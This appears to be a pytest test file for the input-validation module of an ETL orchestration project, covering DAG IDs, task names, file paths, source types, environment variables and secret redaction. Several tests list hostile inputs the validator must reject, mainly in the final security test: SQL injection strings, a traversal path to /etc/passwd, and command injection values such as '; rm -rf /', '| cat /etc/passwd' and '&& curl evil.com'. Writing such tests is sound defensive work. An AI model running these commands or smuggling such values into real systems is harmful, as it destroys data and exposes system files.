"""Tests for the validation module."""

import os
import tempfile
from pathlib import Path

import pytest

from agent_orchestrated_etl.validation import (
    ValidationError,
    safe_dag_id_type,
    safe_path_type,
    safe_source_type,
    sanitize_json_output,
    validate_dag_id,
    validate_environment_variable,
    validate_file_path,
    validate_source_type,
    validate_task_name,
)


class TestValidateDagId:
    """Test DAG ID validation."""

    def test_valid_dag_ids(self):
        """Test that valid DAG IDs pass validation."""
        valid_ids = [
            "simple_dag",
            "dag123",
            "complex_dag_name_123",
            "DAG_WITH_CAPS",
            "dag-with-hyphens",
            "_underscore_start",
        ]

        for dag_id in valid_ids:
            assert validate_dag_id(dag_id) == dag_id

    def test_invalid_dag_ids(self):
        """Test that invalid DAG IDs raise ValidationError."""
        invalid_ids = [
            "",  # Empty
            "123dag",  # Starts with number
            "dag with spaces",  # Contains spaces
            "dag@special!",  # Special characters
            "dag;DROP TABLE;",  # SQL injection attempt
            "dag\nwith\nnewlines",  # Newlines
            "a" * 201,  # Too long
        ]

        for dag_id in invalid_ids:
            with pytest.raises(ValidationError):
                validate_dag_id(dag_id)


class TestValidateTaskName:
    """Test task name validation."""

    def test_valid_task_names(self):
        """Test that valid task names pass validation."""
        valid_names = [
            "extract_users",
            "transform_123",
            "load-data",
            "TASK_NAME",
        ]

        for name in valid_names:
            assert validate_task_name(name) == name

    def test_invalid_task_names(self):
        """Test that invalid task names raise ValidationError."""
        invalid_names = [
            "",  # Empty
            "task with spaces",  # Spaces
            "task@special",  # Special characters
            "task;DROP TABLE;",  # SQL injection
            "a" * 251,  # Too long
        ]

        for name in invalid_names:
            with pytest.raises(ValidationError):
                validate_task_name(name)


class TestValidateFilePath:
    """Test file path validation."""

    def test_valid_file_paths(self):
        """Test that valid file paths pass validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            valid_path = Path(temp_dir) / "test.py"
            result = validate_file_path(str(valid_path))
            assert Path(result).name == "test.py"

    def test_invalid_file_paths(self):
        """Test that invalid file paths raise ValidationError."""
        invalid_paths = [
            "",  # Empty
            "path\x00with\x00null",  # Null bytes
            "path\nwith\nnewlines",  # Newlines
            "-starts-with-dash",  # Command injection attempt
        ]

        for path in invalid_paths:
            with pytest.raises(ValidationError):
                validate_file_path(path)

    def test_directory_traversal_protection(self):
        """Test protection against directory traversal."""
        # This should not raise an error but should be handled safely
        try:
            result = validate_file_path("../../../etc/passwd")
            # Should complete without error but with safety checks
            assert isinstance(result, str)
        except ValidationError:
            # Acceptable to reject as well
            pass


class TestValidateSourceType:
    """Test source type validation."""

    def test_valid_source_types(self):
        """Test that valid source types pass validation."""
        supported = {"s3", "postgresql", "api"}

        for source in supported:
            result = validate_source_type(source, supported)
            assert result == source

    def test_invalid_source_types(self):
        """Test that invalid source types raise ValidationError."""
        supported = {"s3", "postgresql", "api"}

        invalid_sources = [
            "",  # Empty
            "mysql",  # Not supported
            "s3; DROP TABLE;",  # SQL injection
            "api'OR'1'='1",  # SQL injection
            "source with spaces",  # Invalid characters
        ]

        for source in invalid_sources:
            with pytest.raises(ValidationError):
                validate_source_type(source, supported)


class TestValidateEnvironmentVariable:
    """Test environment variable validation."""

    def test_valid_env_var(self):
        """Test valid environment variable."""
        os.environ["TEST_VAR"] = "test_value"
        try:
            result = validate_environment_variable("TEST_VAR")
            assert result == "test_value"
        finally:
            del os.environ["TEST_VAR"]

    def test_missing_env_var(self):
        """Test missing environment variable."""
        with pytest.raises(ValidationError):
            validate_environment_variable("NONEXISTENT_VAR")

    def test_invalid_env_var_name(self):
        """Test invalid environment variable name."""
        invalid_names = [
            "",  # Empty
            "123_VAR",  # Starts with number
            "var with spaces",  # Contains spaces
            "var-with-hyphens",  # Contains hyphens
        ]

        for name in invalid_names:
            with pytest.raises(ValidationError):
                validate_environment_variable(name, "value")


class TestSanitizeJsonOutput:
    """Test JSON output sanitization."""

    def test_sanitize_sensitive_keys(self):
        """Test that sensitive keys are redacted."""
        data = {
            "username": "user",
            "password": "secret123",
            "api_key": "key123",
            "token": "token123",
            "normal_field": "value",
        }

        result = sanitize_json_output(data)

        assert result["username"] == "user"
        assert result["password"] == "[REDACTED]"
        assert result["api_key"] == "[REDACTED]"
        assert result["token"] == "[REDACTED]"
        assert result["normal_field"] == "value"

    def test_sanitize_nested_data(self):
        """Test sanitization of nested data structures."""
        data = {
            "config": {
                "database_password": "secret",
                "host": "localhost",
            },
            "secrets": ["password=secret", "normal_data"],
        }

        result = sanitize_json_output(data)

        assert result["config"]["database_password"] == "[REDACTED]"
        assert result["config"]["host"] == "localhost"
        assert result["secrets"][0] == "[REDACTED - SENSITIVE DATA DETECTED]"
        assert result["secrets"][1] == "normal_data"


class TestArgparseTypeFunctions:
    """Test argparse type functions."""

    def test_safe_path_type(self):
        """Test safe_path_type function."""
        with tempfile.TemporaryDirectory() as temp_dir:
            valid_path = Path(temp_dir) / "test.txt"
            result = safe_path_type(str(valid_path))
            assert Path(result).name == "test.txt"

    def test_safe_dag_id_type(self):
        """Test safe_dag_id_type function."""
        result = safe_dag_id_type("valid_dag_123")
        assert result == "valid_dag_123"

    def test_safe_source_type_factory(self):
        """Test safe_source_type factory function."""
        supported = {"s3", "postgresql", "api"}
        validator = safe_source_type(supported)

        result = validator("s3")
        assert result == "s3"

        with pytest.raises(Exception):  # argparse.ArgumentTypeError
            validator("unsupported")


class TestValidationIntegration:
    """Integration tests for validation functions."""

    def test_validation_with_real_data(self):
        """Test validation functions with realistic data."""
        # Test a complete DAG generation scenario
        dag_id = validate_dag_id("etl_pipeline_v1")
        assert dag_id == "etl_pipeline_v1"

        task_name = validate_task_name("extract_users")
        assert task_name == "extract_users"

        source_type = validate_source_type("postgresql", {"postgresql", "s3", "api"})
        assert source_type == "postgresql"

        # Test with invalid inputs
        with pytest.raises(ValidationError):
            validate_dag_id("pipeline; DROP TABLE dags; --")

        with pytest.raises(ValidationError):
            validate_task_name("extract'; DELETE FROM tasks; --")

    def test_security_against_common_attacks(self):
        """Test protection against common security attacks."""
        # SQL injection attempts
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "UNION SELECT * FROM secrets",
        ]

        for attempt in sql_injection_attempts:
            with pytest.raises(ValidationError):
                validate_dag_id(attempt)
            with pytest.raises(ValidationError):
                validate_task_name(attempt)
            with pytest.raises(ValidationError):
                validate_source_type(attempt, {"s3", "postgresql", "api"})

        # Command injection attempts
        command_injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "$(whoami)",
        ]

        for attempt in command_injection_attempts:
            with pytest.raises(ValidationError):
                validate_dag_id(attempt)
            with pytest.raises(ValidationError):
                validate_task_name(attempt)
